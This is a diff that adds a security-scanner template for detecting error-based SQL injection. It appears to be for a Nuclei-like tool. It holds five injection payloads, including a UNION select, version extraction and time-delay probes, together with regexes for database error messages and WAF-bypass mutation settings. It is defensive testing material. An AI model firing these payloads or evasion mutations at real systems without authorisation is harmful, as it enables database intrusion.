@@ -1,0 +1,42 @@
+id: sqli-error-based
+
+info:
+  name: SQL Injection — Error-Based Detection
+  author: dalisecurity
+  severity: critical
+  tags: [sqli, error-based, owasp-top10]
+  description: Detects error-based SQL injection via common database error messages
+  reference:
+    - https://owasp.org/www-community/attacks/SQL_Injection
+  remediation: Use parameterized queries and input validation
+  classification:
+    cwe-id: CWE-89
+
+http:
+  - method: GET
+    path: /api/item?id={{payload}}
+    payloads:
+      - "' OR '1'='1"
+      - "1 UNION SELECT NULL--"
+      - "1' AND 1=CONVERT(int,(SELECT @@version))--"
+      - "' WAITFOR DELAY '0:0:5'--"
+      - "1; SELECT pg_sleep(5)--"
+    matchers:
+      - type: regex
+        regex:
+          - 'SQL syntax.*MySQL'
+          - 'Warning.*mysql_'
+          - 'PostgreSQL.*ERROR'
+          - 'ORA-[0-9]{5}'
+          - 'Microsoft.*ODBC.*SQL Server'
+          - 'Unclosed quotation mark'
+          - 'SQLSTATE\['
+        part: body
+        condition: or
+      - type: status
+        status: [200, 500]
+        condition: or
+    waf_bypass:
+      mutations: true
+      max_mutations: 5
+      strategies: [unicode_escape, comment_insertion, whitespace_variation, case_swap]
